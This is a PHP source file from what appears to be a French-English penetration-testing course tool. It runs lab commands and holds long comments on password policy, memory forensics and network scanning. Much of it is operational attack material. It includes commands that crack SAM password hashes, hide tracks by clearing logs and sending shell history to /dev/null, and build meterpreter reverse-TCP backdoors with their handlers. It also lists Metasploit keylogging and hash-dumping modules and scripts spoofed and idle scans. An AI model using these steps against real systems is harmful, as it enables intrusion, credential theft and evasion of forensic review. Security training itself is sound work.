		• HISTORY Number of passwords stored in password history.
		User will not be allowed to reuse these values
		• MINALPHA		Minimum number of alpha characters
		• MINDIGIT		Minimum number of numerical characters
		• MINSPECIAL		Minimum number of special characters (nonalpha,nonnumeric)
		• MINLOWER		Minimum number of lowercase characters
		• MINUPPER		Minimum number of uppercase characters

		The default Solaris install does not provide support for pam_cracklib or pam_
		passwdqc. If the OS password complexity rules are insufficient, then one of the PAM

		modules can be implemented. Whether you rely on the operating system or third-party products, it is important that you implement good password management procedures
		and use common sense. Consider the following:
		• Ensure all users have a password that conforms to organizational policy.
		• Force a password change every 30 days for privileged accounts and every 60 days for normal users.
		• Implement a minimum password length of eight characters consisting of at least one alpha character, one numeric character, and one nonalphanumeric character.
		• Log multiple authentication failures.
		• Configure services to disconnect clients after three invalid login attempts.
		• Implement account lockout where possible. (Be aware of potential denial of service issues of accounts being locked out intentionally by an attacker.)
		• Disable services that are not used.
		• Implement password composition tools that prohibit the user from choosing a poor password.
		• Don’t use the same password for every system you log into.
		• Don’t write down your password.
		• Don’t tell your password to others.
		• Use one-time passwords when possible.
		• Don’t use passwords at all. Use public key authentication.
		• Ensure that default accounts such as “setup” and “admin” do not have default passwords.");
		
		
		
		/*
		 * labs@labs:~/Bureau/CEH$ grep MemTotal /proc/meminfo
		 * MemTotal: 16264080 kB
		 * grep SwapTotal /proc/meminfo
		 * sudo lshw
		 * cat /proc/cpuinfo
		 * free -m : info mémoire
		 * vmstat : info ram, swap, cpu
		 *
		 */
		
		
		$this->gtitre("Working with Memory");
		$this->titre("Analyse RAM");
		$this->article("Analyse de la RAM", "
La première question qu’on peut se poser c’est pourquoi analyser la mémoire et ne pas se contenter de la récupération d’une image du disque ? La réponse est tout simplement que la mémoire RAM peut contenir :
		
    Les processus légitime et les malwares,
    Les URL, les adresses IP, les connexions réseaux,
    Les fichiers,
    Le contenu du presse-papier,
    Les clés de chiffrement et les mots de passe,
    Les dll chargées,
    Les clés de registre.
		
Ce qui nous permet en cas de détection rapide d’un comportement malveillant d’étudier la configuration du système en cours d'exécution, de comprendre le fonctionnement du malware même si le code est offusqué, d’élaborer un déroulement chronologique des événments
Un autre avantage d’un dump mémoire est que les malwares sont en cours d’exécution ce qui permet de voir les chaînes de caractères utilisées comme par exemple les adresses command and control (C&C) ; dans ce cas les chaînes sont la plupart du temps en clair dans la mémoire.
Il faut préciser que lorsqu’un appareil est soupçonné d’être infecté, nous ne pouvons plus faire confiance aux résultats fournis par les commandes ou les utilitaires installés car ceux-ci risquent d’être compromis. Pour cela, un moyen qui permet d’avoir un résultat correct sans trop polluer le système consiste à utiliser nos propres outils d’analyses et faire nos investigations sur une autre machine après avoir bien évidement récupéré le dump mémoire à analyser. ");
		
		os_get_memory ();
		
		
		$vmem = "$this->dir_tools/memory/xp-laptop_WinXPSP2x86-2005-06-25.vmem";
		$this->profile = "WinXPSP2x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/xp-laptop_WinXPSP2x86-2005-07-04-1430.vmem";
		$this->profile = "WinXPSP2x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/boomer-Win2003SP0x86-2006-03-17.vmem";
		$this->profile = "Win2003SP0x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/Win7SP1x86_Trojan_DarkComet_RAT.vmem";
		$this->profile = "Win7SP1x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/Win2008SP1x86.vmem";
		$this->profile = "Win2008SP1x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/spyeye_WinXPSP2x86.vmem";
		$this->profile = "WinXPSP2x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/stuxnet_WinXPSP3x86.vmem";
		$this->profile = "WinXPSP3x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$vmem = "$this->dir_tools/memory/zeus_WinXPSP2x86.vmem";
		$this->profile = "WinXPSP2x86";
		win_Information_sam_file($rep_path, $vmem, $this->profile);
		$this->titre("Password SAM");
		$this->requette("cat $this->dir_tmp/sam.hash | sort | uniq > $this->dir_tmp/crack_sam.txt");
		$this->requette("cat -n $this->dir_tmp/crack_sam.txt");
		$this->ssTitre("Crack Password SAM");
		$this->cmd("localhost", "cd /opt/john-1.8.0/run/ ;sudo ./john $this->dir_tmp/crack_sam.txt --session=$this->dir_tmp/sam.pot --fork=6 --wordlist:\"$this->dir_tools/dico/2M_passwd.lst\" ");
		$this->ssTitre("Show Results");
		$this->requette("cd /opt/john-1.8.0/run/ ;sudo ./john --show $this->dir_tmp/crack_sam.txt");
		
		
		$this->requette("strings $vmem | grep -i $chaine ");


}
// ###################################################################################

public function poc4host4root4coveringTracks() {
		$this->chapitre("covering Tracks");
		/*
		 *
		 *  * clearev
		 * Clear the event log on the target machine.
		 *
		 * timestomp
		 * Change file attributes, such as creation date (antiforensics measure).
		 *
		 * voir les liens qui recherches sur les registre + linux (rkhunter)
		 *
		 *
		 * $this->dir_tools/3vilshell.c evilshell.c
		 * the backdoor launch the connection to the pc when it recieve the paquet
		 * ICMP ping with the filled fields like this :
		 * id : 1337
		 * code : 0
		 * type : 8
		 * Simple backdoor reverse connect (outside connexion from host LAN -> firewall).(80|445)
		 * cryptographic connexion .
		 * need passwd for connect backdoor .
		 * change the name procecus for hide the command ps .
		 * ignore signal SIGTERM SIGINT SIGQUIT for don't stop the backdoor .
		 * redirect stderr in /dev/null for discret .
		 * create procecus child for execute the evil code .
		 * need passwd for connect backdoor .
		 * redirect bash history (HISTFILE) in /dev/null for the new shell .
		 * redirect stdout , stdin in socket client .
		 *
		 * find / -name "namefile" = file namefile
		 * ls -aR
		 * /root/.bash_history
		 * /home/rohff-r6h4ck3r/.bash_history
		 * /home/rohff-r6h4ck3r/.mysql_history
		 * $ ctrl r -> permet de voir dans l'historique qu'on a tappe
		 *
		 * cat lastlog -> dernier log en SSH
		 * ln -s /dev/null lastlog
		 * ln -s .bash_history /dev/null
		 * unset HISTORY
		 *
		 * vdo("cover_track.flv");
		 *
		 * Linux
		 * To be perfectly honest, the post-exploitation module-set for Linux hosts is really lacking. Part
		 * of this could be due to the strength of the shell you get right out of the box on Linux hosts,
		 * allowing you much more functionality out of your shell than, say, a Windows command prompt.
		 * This shouldn’t be an excuse, however. For full integration with the framework, many functions
		 * of the shell could easily be implemented as post modules and saved to the database for later
		 * processing.
		 * Post modules to collect files of interest such as ~/.bash_history, ~/.ssh/, known_hosts, .bashrc,
		 * etc.. would be immensely useful if integrated into the framework via loot. In a later section, I
		 * will supply resources to help bridge this gap in Metasploit. However, simply bridging this gap
		 * with duct tape isn’t a very fruitful way of dealing with the problem. Techniques described in later
		 * sections for bridging these gaps should be implemented within post modules if at all possible.
		 * Integration with the framework is key to having a fluid, straight-forward idea of exploiting your
		 * target later.
		 */
}
		
		public function poc4lan4crypto(){
		// ######### CRYPTOGRAPHY #############
		$this->poc4crypto();
		// ###########################
		
		ssl ();
		https ();
		
		// openssl s_client -host google.com -port 443 -prexit -showcerts
		
		// ssTitre("Creates a 2048-bit RSA key pair and generates a Certificate Signing Request for it");
		// requette("openssl req -new -nodes -newkey rsa:2048 -keyout newprivate.key -out request.csr");
		$this->pause();
		// ###########################
		}
		
		
		public function poc4lan4sniffing(){
		/*
		 * tcptrace archivo.pcap
		 * tcptrace -o3 -P captura3.pcap
		 * tcptrace -o5 -r -l captura3.pcap
		 *
		 * net("https://www.virustotal.com/en/ip-address/199.217.115.62/information/");
		 *
		 * phishing -> in top news net("http://thehackernews.com/2014/03/malaysian-flight-mh370-tragedy-abused.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+TheHackersNews+%28The+Hackers+News+-+Security+Blog%29");
		 *
		 * 3.6.26 The sameip Keyword
		 * The sameip keyword is used to check if source and destination IP addresses are the same in an IP
		 * packet. It has no arguments. Some people try to spoof IP packets to get information or attack a
		 * server. The following rule can be used to detect these attempts.
		 * alert ip any any -> 192.168.1.0/24 any (msg: "Same IP"; sameip;)
		 *
		 *
		 * Faux serveurs DHCP
		 * Cette attaque vient en complément de la première. Si un pirate a réussi à saturer un serveur DHCP par épuisement de
		 * ressources, il peut très bien en activer un autre à la place. Ainsi il pourra ainsi contrôler tout le trafic réseau.
		 *
		 *
		 *
		 * scan arp -> identifier les mac /usr/share/ettercap/etter.fields
		 * rsync -av -e "ssh -o MACs=hmac-ripemd160" --progress --partial user@remotehost://path/to/remote/stuff
		 * traceroute: il envoit UDP et lorsque le ttl=0 la reponse est ICMP type 11 time exceed -> a la fin en recoit icmp type 3 (unreachable)-> wireshark
		 * tcpreplay | bistreams -> duplique le traffic comme tee en sortie
		 *
		 *
		 *
		 *
		 *
		 *
		 * tcpdump src host 10.100.20.100 and dst host 10.100.25.2 or dst host 10.100.25.1 and tcp and port 80
		 * ngrep -d eth0 -i 'USER|PASS' tcp port 21 -> password
		 * ipgrabe -i eth0 -> see partie paquets (Recherche d'informations précises (surtout chaine de caracteres) dans des trames)
		 * tcpflow : Permet de visualiser en ASCII le contenu des paquets et de rassembler les sessions TCP sur disque.
		 * nstreams -l wlan0 : show traffic protocols known
		 * alert ip any any -> 192.168.1.0/24 any (content-list: "porn"; msg: "Porn word matched";)
		 * alert ip any any -> 192.168.1.0/24 any (dsize: > 6000; msg: "Large size IP packet detected";)
		 *
		 * alert ip any any -> any any (ip_proto: ipip; msg: "IP-IP tunneling detected";)
		 * alert tcp 192.168.1.0/24 any -> any 80 (msg: "Outgoing HTTP connection"; react: block;)
		 *
		 *
		 *
		 * using the IP Header Length field in order to elicit ICMP Parameter Problem error message back from the probed host:
		 * How we determine the ACL (ICMP Protocol embedded inside)?
		 * When the embedded protocol is ICMP, we send various ICMP message types encapsulated
		 * inside IP datagrams with bad IP header(s). If we receive a reply from a Destination IP address we
		 * have a host that is alive and an ACL, which allows this type of message of ICMP to get to the
		 * host who generated the ICMP error message (and the Parameter Problem ICMP error message
		 * is allowed from the destination host to the Internet).
		 * If we are not getting any reply than one of three possibilities:
		 * • The Filtering Device disallows datagrams with the kind of bad field we are using.
		 * • The Filtering Device is filtering the type of the ICMP message we are using.
		 * • The Filtering Device blocks ICMP Parameter Problem error messages initiated from the protected network destined to the Internet.
		 *
		 */
		
		$this->start("Man In The Middle Attack");
		
		// ######### MITM #############
		// dhcpStarvationAttack(); // not yet
		intro_mitm ();
		arpPoisoning (); // ok
		macFlooding (); // ok
		modif_flux ();
		dnsPoisoning (); // ok
		
		/*
		 * iftop : dans la même veine que top, iftop sert à surveiller toutes les connexions réseau. Attention, iftop nécessite les privilèges root pour être lancé. Si vous n’êtes pas root, pensez à le faire précéder de sudo.
		 * speedometer : un peu plus graphique que iftop, speedometer monitor le traffic de vos entrées/sorties, permet de surveiller la progression d’un téléchargement, de savoir combien de temps il faudra pour transférer tel fichier ou encore de connaître la vitesse d’écriture de votre système
		 * netstat -nr pour la table de routage (revient au même que route),
		 * netstat -i donne des statistiques sur les différentes interfaces réseau,
		 * netstat -s personnellement je ne m'en sert que très rarement, mais c'est un résumé de toutes les stats réseaux, alors ça peut être utile de temps à autre,
		 */
		}
		
		
		
		public function poc4lan2host4sys4enum(){
		// hide activities (process, repository, files ...etc)
		
		// Passive collect information utils sur le hosts (cpu fichier sensible, promiciouse mode ...etc)
		// * tcptraceroute mail.google.com 443
		
		// $ hostname --all-ip-addresses
		
		// Erase tracks
		// Erase tracks : debug metasploit run getcontermeasure On windows + Linux
		
		/*
		 *
		 * use post/linux/gather/hashdump
		 * use post/linux/gather/enum_linux
		 * use post/windows/manage/enable_rdp
		 * use post/windows/gather/enum_logged_on_users
		 *
		 *
		 *
		 *
		 *
		 * Proxies allow you to reach around firewalls, or to obfuscate yourself so that your actions appear
		 * to be coming from elsewhere. The Metasploit Framework has the ability to discover open HTTP
		 * proxies and poorly configured reverse proxies on the network:
		 * msf > use auxiliary/scanner/http/open_proxy
		 * msf auxiliary(open_proxy) > set RHOSTS 192.168.1.0/24
		 * msf auxiliary(open_proxy) > run
		 *
		 *
		 *
		 *
		 *
		 * Source Code and File Repositories
		 * SVN
		 * This is a common source code repository. It is free, open source, and easy to configure and
		 * use. Clients for this repository are available for both Linux, Mac OSX, and Windows, and is
		 * generally easily integrated with major IDE’s such as Visual Studio and X-Code.
		 * msf > use auxiliary/scanner/http/svn_scanner
		 * msf auxiliary(svn_scanner) > set RHOSTS 192.168.1.0/24
		 * msf auxiliary(svn_scanner) > run
		 *
		 * WebDAV
		 * Per Wikipedia, Web-based Distributed Authoring and Versioning (WebDAV) is a set of
		 * methods based on the Hypertext Transfer Protocol (HTTP) that facilitates collaboration between
		 * users in editing and managing documents and files stored on World Wide Web servers.
		 * Many companies utilize WebDAV for file and information sharing across their company. This
		 * can be a haven for information on how business is done within the company.
		 * msf > use auxiliary/scanner/http/webdav_scanner
		 * msf auxiliary(webdav_scanner) > set RHOSTS 192.168.1.0/24
		 * msf auxiliary(webdav_scanner) > run
		 *
		 *
		 * You may also run post modules directly from meterpreter:
		 * meterpreter> run post/windows/gather/enum_applications
		 * You may not get shell on a Windows box however. Many of Metasploit’s modules focus on
		 * Windows, but all hope isn’t lost for Linux. To enumerate currently installed packages, for
		 * instance:
		 * msf > use post/linux/gather/enum_packages
		 * msf post(enum_packages) > set SESSION 1
		 * msf post(enum_packages) > run
		 *
		 *
		 * List Drivers and Devices
		 * Device drivers have security holes as well. PTES never mentions this but it can be very
		 * handy when you can execute code via a driver bug in Ring 0. Look at post/windows/gather/
		 * enum_devices. This module takes a very long time to run, it is recommended to run it as a
		 * background job while you perform other tasks:
		 * msf > use post/windows/gather/enum_devices
		 * msf post(enum_devices) > set SESSION 1
		 * msf post(enum_devices) > run
		 * This will surely get you SYSTEM if you don’t have it already. This driver was installed on most
		 * Dell laptops (and probably others) from 4-5 years ago:
		 * msf > use exploit/windows/driver/broadcom_wifi_ssid
		 * msf exploit(broadcom_wifi_ssid) > run
		 *
		 *
		 * List Services
		 * Services give you an idea of what is running on the computer that Task Manager isn’t telling
		 * you about. Services can give a great deal of info on what the computer is used for and how you
		 * should look into exploiting it further:
		 * msf > use post/windows/gather/enum_services
		 * msf post(enum_services) > set SESSION 1
		 * msf post(enum_services) > run
		 * For a Linux box, you would run:
		 * msf > use post/linux/gather/enum_servicmsf post(enum_services) > set SESSION 1
		 * msf post(enum_services) > run
		 *
		 *
		 * List Shares
		 * You may list two types of shares actually within Metasploit. Local ones, (F:, H:, Z:) and remote
		 * (\\serverwiththepasswords):
		 * msf > use post/windows/gather/enum_shares
		 * msf post(enum_shares) > set SESSION 1
		 * msf post(enum_shares) > run
		 * To get a list of shares available on the network from the perspective of the victim, you may use
		 * the netdiscovery module written by mubix.
		 * msf > use post/windows/gather/netdiscovery
		 * msf post(netdiscovery) > set SESSION 1
		 * msf post(netdiscovery) > run
		 *
		 * Password and Credential Collection
		 * PTES talks about getting IM client and web browser credentials, but why stop there? Metasploit
		 * offers far more password (hash) dumping options. Outlook (every business uses outlook),
		 * WinSCP, VNC, and a slew of others are easily dumped.
		 * The hashdump modules for Windows and Linux dump the local users hashes from Metasploit.
		 * Obviously, they use two different mechanisms for dumping the hashes. The Linux hashdump
		 * must be run as root and will grab the information from /etc/passwd and /etc/shadow.
		 * msf > use post/linux/gather/hashdump
		 * msf post(hashdump) > set SESSION 1
		 * msf post(hashdump) > run
		 * The Windows hashdump is far more complicated, as it actually decrypts the hashes out of the
		 * SAM file.
		 * msf > use post/windows/gather/hashdump
		 * msf post(hashdump) > set SESSION 1
		 * msf post(hashdump) > run
		 * Another option for credentials on the domain level is cachedump. It is Windows-only, and
		 * extracts the stored domain hashes that have been cached as a result of a GPO setting. The
		 * default setting on Windows is to store the last ten successful logins.
		 * msf > use post/windows/gather/cachedump
		 * msf post(cachedump) > set SESSION 1
		 * msf post(cachedump) > run
		 * A module that sort of melds cachedump and hashdump together is smart_hashdump. This will
		 * dump local accounts from the SAM hive. If the target host is a Domain Controller, it will dump
		 * 36
		 * the Domain Account Database using the proper technique depending on privilege level, OS and
		 * role of the host. This one is thanks to Carlos ‘Darkoperator’ Perez.
		 * msf > use post/windows/gather/smart_hashdump
		 * msf post(smart_hashdump) > set SESSION 1
		 * msf post(smart_hashdump) > run
		 *
		 *
		 * History/Logs
		 * Linux
		 * To be perfectly honest, the post-exploitation module-set for Linux hosts is really lacking. Part
		 * of this could be due to the strength of the shell you get right out of the box on Linux hosts,
		 * allowing you much more functionality out of your shell than, say, a Windows command prompt.
		 * This shouldn’t be an excuse, however. For full integration with the framework, many functions
		 * of the shell could easily be implemented as post modules and saved to the database for later
		 * processing.
		 * Post modules to collect files of interest such as ~/.bash_history, ~/.ssh/, known_hosts, .bashrc,
		 * etc.. would be immensely useful if integrated into the framework via loot. In a later section, I
		 * will supply resources to help bridge this gap in Metasploit. However, simply bridging this gap
		 * with duct tape isn’t a very fruitful way of dealing with the problem. Techniques described in later
		 * sections for bridging these gaps should be implemented within post modules if at all possible.
		 * Integration with the framework is key to having a fluid, straight-forward idea of exploiting your
		 * target later.
		 * Windows
		 * No Windows post modules allow for the dumping of event history or past commands. Part of
		 * 37
		 * this is due to lack of inherent functionality within Windows itself. Windows does not save past
		 * commands across shell sessions like Linux does. If you happen across an open prompt, you
		 * may use the ‘doskey /history’ command to view past commands in that prompt session, but that is
		 * as close as you will get.
		 * There are options, however, to bridge this gap. See dumpel.exe on this page:
		 * http://support.microsoft.com/kb/927229
		 * A good thing about the executables above is that AV won’t detect these as malware. They are
		 * typical systems administrator utilities (put out by Microsoft no less). Dumping the event logs into
		 * loot would be an excellent endeavour for a post module.
		 *
		 */
		
		
		$this->article("Enum", "
		post/linux/gather/enum_configs                                                    normal  Linux Gather Configurations
		post/linux/gather/enum_network                                                    normal  Linux Gather Network Information
		post/linux/gather/enum_protections                                                normal  Linux Gather Protection Enumeration
		post/linux/gather/enum_system                                                     normal  Linux Gather System and User Information
		post/linux/gather/enum_users_history                                              normal  Linux Gather User History
		post/windows/gather/enum_ad_computers                                             normal  Windows Gather AD Enumerate Computers
		post/windows/gather/enum_applications                                             normal  Windows Gather Installed Application Enumeration
		post/windows/gather/enum_artifacts                                                normal  Windows Gather File and Registry Artifacts Enumeration
		post/windows/gather/enum_chrome                                                   normal  Windows Gather Google Chrome User Data Enumeration
		post/windows/gather/enum_computers                                                normal  Windows Gather Enumerate Computers
		post/windows/gather/enum_db                                                       normal  Windows Gather Database Instance Enumeration
		post/windows/gather/enum_devices                                                  normal  Windows Gather Hardware Enumeration
		post/windows/gather/enum_dirperms                                                 normal  Windows Gather Directory Permissions Enumeration
		post/windows/gather/enum_domain                                                   normal  Windows Gather Enumerate Domain
		post/windows/gather/enum_domain_group_users                                       normal  Windows Gather Enumerate Domain Group
		post/windows/gather/enum_domain_tokens                                            normal  Windows Gather Enumerate Domain Tokens
		post/windows/gather/enum_domains                                                  normal  Windows Gather Domain Enumeration
		post/windows/gather/enum_files                                                    normal  Windows Gather Generic File Collection
		post/windows/gather/enum_hostfile                                                 normal  Windows Gather Windows Host File Enumeration
		post/windows/gather/enum_ie                                                       normal  Windows Gather Internet Explorer User Data Enumeration
		post/windows/gather/enum_logged_on_users                                          normal  Windows Gather Logged On User Enumeration (Registry)
		post/windows/gather/enum_ms_product_keys                                          normal  Windows Gather Product Key
		post/windows/gather/enum_powershell_env                                           normal  Windows Gather Powershell Environment Setting Enumeration
		post/windows/gather/enum_prefetch                                                 normal  Windows Gather Prefetch File Information
		post/windows/gather/enum_proxy                                                    normal  Windows Gather Proxy Setting
		post/windows/gather/enum_services                                                 normal  Windows Gather Service Info Enumeration
		post/windows/gather/enum_shares                                                   normal  Windows Gather SMB Share Enumeration via Registry
		post/windows/gather/enum_snmp                                                     normal  Windows Gather SNMP Settings Enumeration (Registry)
		post/windows/gather/enum_termserv                                                 normal  Windows Gather Terminal Server Client Connection Information Dumper
		post/windows/gather/enum_tokens                                                   normal  Windows Gather Enumerate Domain Admin Tokens (Token Hunter)
		post/windows/gather/enum_tomcat                                                   normal  Windows Gather Tomcat Server Enumeration
		post/windows/gather/enum_unattend                                                 normal  Windows Gather Unattended Answer File Enumeration
		post/windows/gather/forensics/enum_drives                                         normal  Windows Gather Physical Drives and Logical Volumes
		post/windows/gather/forensics/recovery_files                                      normal  Windows Gather Deleted Files Enumeration and Recovering
		post/windows/gather/local_admin_search_enum                                       normal  Windows Gather Local Admin Search
		post/windows/gather/usb_history                                                   normal  Windows Gather USB Drive History
		post/windows/gather/win_privs                                                     normal  Windows Gather Privileges Enumeration");
		
		// ############ POST Exploitation ###########
		$this->article("Do this", "Need later for xplico");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S tcpdump -s 0 -i eth0 -w $this->dir_tmp/hack.vlan.pcap");
		$this->pause();
		$this->titre("After gain root Acces");
		$this->ssTitre("Creation de backdoor TCP avec MSF MODE Reverse pour cible Linux");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfpayload windows/meterpreter/reverse_tcp LHOST=$this->prof LPORT=3333 x > $this->dir_tmp/backdoor_win_reverse.exe");
		$this->cmd("meterpreter>", "run prefetchtool --x 10");
		$this->article("prefetchtool", "permet d’avoir les 10 programmes les plus utilisés (un bon début poursavoir à quoi sert essentiellement le poste cible et  pour chercher ou  placer notre Backdoor).");
		$this->cmd("meterpreter>", "run get_application_list");
		$this->cmd("meterpreter>", "run scrapper");
		$this->article("scrapper", "permet de récupérer d’importer sur notre poste tout un tas d’informations sur la cible (notamment le registre, hash, utilisateurs, système infos…).");
		$this->cmd("meterpreter>", "run keylogrecorder");
		$this->cmd("meterpreter>", "run getcontermeasure");
		$this->article("getcontermeasure", "cover track");
		$this->cmd("meterpreter>", "run idletime");
		$this->article("idletime", "voir depuis combien de temps l’utilisateur est inactif.");
		$this->cmd("meterpreter>", "run getgui -u victime -p victime");
		$this->article("getgui", "add user");
		$this->article("linux", "useradd -m -d /home/student2 -c \"Hacked Unreal\" -s /bin/bash student2");
		$this->article("windows", "later");
		$this->pause();
		
		$this->ssTitre("Windows");
		$query = "echo \"db_status\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST \"$this->prof\"\nset LPORT 3333\nrun\nexit\n \" > $this->dir_tmp/windows_gather.rc";
		system($query);
		$this->requette("cat $this->dir_tmp/windows_gather.rc");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/windows_gather.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
		$this->pause();
		$this->ssTitre("Linux");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfpayload linux/x86/meterpreter/reverse_tcp LHOST=$this->prof LPORT=2222 x > $this->dir_tmp/backdoor_linux_reverse");
		$query = "echo \"db_status\nuse exploit/multi/handler\nset payload linux/x86/meterpreter/reverse_tcp\nset LHOST \"$this->prof\"\nset LPORT 2222\nrun\nexit\n \" > $this->dir_tmp/linux_gather.rc";
		system($query);
		$this->requette("cat $this->dir_tmp/linux_gather.rc");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/linux_gather.rc -y /opt/metasploit/apps/pro/ui/config/database.yml");
		$this->pause();
		
		$this->titre("Find our Interface");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap --iflist ");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S netstat -r ");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S route");
		$this->cmd("localhost", "ifconfig ");
		$this->pause();
		
		$this->ssTitre("Scan ARP");
		$this->net("http://nmap.org/book/nping-man-arp-mode.html");
		$this->cmd("localhost", "echo '$this->root_passwd' | sudo -S wireshark -i $this->eth_lan -k");
		$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S arp -av -i $this->eth_lan");
		// In previous releases of Nmap, -sn was known as -sP.
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -sn -n --reason 10.50.10.0/24 -e $this->eth_lan ");
		$this->requette("echo '$this->root_passwd' | sudo -S arp -av -i $this->eth_lan");
		$this->pause();
		$this->ssTitre("Bypass ACL protection");
		$this->img("lan/Mac_Spoofing.png");
		$this->pause();
		$this->ssTitre("Spoofing MAC & IP Mode Promiscuous");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -sn -n --reason 10.50.10.0/24 --spoof-mac=11:22:33:44:55:66 -S 10.50.10.100 -e $this->eth_lan -oX $this->dir_tmp/ip_lan_victime");
		$this->pause();
		$this->ssTitre("Detect Host Firewalled");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -sA --reason -n --top-ports 5 -f $this->xp $this->msf $this->fw $this->lts $this->win7 $win08 -e $this->eth_lan");
		$this->pause();
		$this->ssTitre("Scan Ports Furtif");
		$this->requette("echo '$this->root_passwd' | sudo -S nmap -n -Pn --top-ports 2000 --open -sI $this->xp $this->msf -e $this->eth_lan");
		$this->pause();
		
		// ####### enum LAN Network ###
		rpc ();
		netbios ();
		snmp ();
		
		// ###########################
		$this->ssTitre("Mapping LAN");
		$this->net("https://github.com/rflynn/lanmap2");
		$this->cmd("localhost", "cd /opt/lanmap2-master/src/;sudo ./cap");
		$this->cmd("localhost", "cd graph && ./graph.sh && cd -");
		$this->ssTitre("View");
		$this->cmd("localhost", "eog /opt/lanmap2-master/graph/net.png");
		$this->pause();
		
		}

	
	
	
	
	
	
	


	public function poc4scan4ip4port(){
	
	
		// Pentest -> nmap -iL filename Read the list of IP addresses from the file filename
		// scan: voir le FIN paquet qd on transmet des données
		// Tcpdump –vttttnneli eth0 > tcpdump.log | usr/local/bin/tcpdump2csv.pl “sip dip dport” < tcpdump.log >sniff.csv Tcpdump2csv.pl
		// tshark -r traffic_sample.pcap -T fields -e ip.src -e ip.dst -e tcp.srcport ip.addr eq vex.honeynet.eg and tcp.flags eq 0x12 and tcp.srcport ne 80 | sort | uniq > tcp_flows.txt
		// tcpdump -vttttnneli eth0 | parsers/tcpdump2csv.pl "sip dip dport"
		// cat file.csv | perl afterglow.pl -c color.properties > file.dot
		// tshark -r file.pcap -e ip.dst -e ip.src -e tcp.srcport -T fields -E separator=, -R "tcp and tcp.flags.syn==1 and tcp.flags.ack==1" | sort | uniq > ipdst_ipsrc_tcpsrc.csv
		// tshark -r file.pcap -e ip.src -e ip.dst -e tcp.dport -T fields -E separator=, -R "tcp and tcp.flags.syn==1 and tcp.flags.ack==0" | sort | uniq > ipdst_ipsrc_tcpsrc.csv
		// mysql -s -u root -p | snort -e 'select ip_src
	
		$scan_syn = <<<SCAN
\t +----------------------------------------------------------------+
\t|| \033[32mTCP: SYN\033[0m ||\033[36m          OPEN\033[0m                   || \033[36m     Close\033[0m      ||
\t +----------------------------------------------------------------+
\t|| \033[36mLinux\033[0m    ||\033[32;1m SYN->\033[0m|\033[33;1m<-SYN/ACK\033[0m|\033[32;1mACK->|RST-ACK->\033[0m || \033[32;1mSYN->\033[0m|\033[33;1m<-RST/ACK\033[0m ||
\t +----------------------------------------------------------------+
\t|| \033[36mWindows\033[0m  ||\033[32;1m SYN->\033[0m|\033[33;1m<-SYN/ACK\033[0m|\033[32;1mACK->|RST-ACK->\033[0m || \033[32;1mSYN->\033[0m|\033[33;1m<-RST/ACK\033[0m ||
\t +----------------------------------------------------------------+\n
SCAN;
	
		$scan_other_syn = <<<SCAN
\t+-----------------------------+
\t|\033[32mNULL: NULL\033[0m|\033[36mOPEN\033[0m      |\033[36mClose\033[0m  |
\t+-----------------------------+
\t|\033[36mLinux\033[0m     |\033[37mno reponse\033[0m|\033[37mRST/ACK\033[0m|
\t+-----------------------------+
\t|\033[36mWindows\033[0m   |\033[37mRST/ACK\033[0m   |\033[37mRST/ACK\033[0m|
\t+-----------------------------+\n
SCAN;
	
		$scan_udp = <<<SCAN
\t+-------------------------------------------+
\t|\033[32mUDP: UDP\033[0m|\033[36mOPEN\033[0m        |\033[36mClose\033[0m                |
\t+-------------------------------------------+
\t| \033[36mLinux\033[0m  |\033[37mUDP-response\033[0m|\033[37mICMP port unreachable\033[0m|
\t+-------------------------------------------+
\t| \033[36mWindows\033[0m|\033[37mUDP-response\033[0m|\033[37mICMP port unreachable\033[0m|
\t+-------------------------------------------+\n
SCAN;
	
		$this->ssTitre("Last Step");
		$this->pause ();
		//$this->graphic_step_1_gathering_info ();
		$this->pause ();
	
		// ######################### INTRO SCAN #######################################
		$this->titre("0x030100 Port Scanning Introduction");
		$this->article("Scanning Ports", "The purpose of the scan is whether software is listening on a given port number.
 Scanning a port occurs in two steps:
     \t1 - sending a packet on port tested;
     \t2 - analysis of the response.");
		$this->pause();
		$this->ssTitre("Ports Scanning Techniques");
		$this->net("http://nmap.org/book/man-port-scanning-techniques.html");
		$this->pause();
		$this->ssTitre("TCP Header");
		$header_tcp = <<<TCP_HEADER
	
       0                              15                              31
       -----------------------------------------------------------------
       |          source port          |       destination port        |
       -----------------------------------------------------------------
       |                        sequence number                        |
       -----------------------------------------------------------------
       |                     acknowledgment number                     |
       -----------------------------------------------------------------
       |  HL   | rsvd  |C|E|U|A|P|R|S|F|        window size            |
       -----------------------------------------------------------------
       |         TCP checksum          |       urgent pointer          |
       -----------------------------------------------------------------
	
TCP_HEADER;
		echo $header_tcp;
		$this->ssTitre("TCP FLAGs");
		$this->img("scan/tcp_flags_nmap.png");
		$this->pause();
		$flags_tcp = <<<FLAGS
\t     0   1   2   3   4   5   6   7   8   9  10  11  12  13  14  15
\t   +---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+---+
\t   |               |               | C | E | U | A | P | R | S | F |
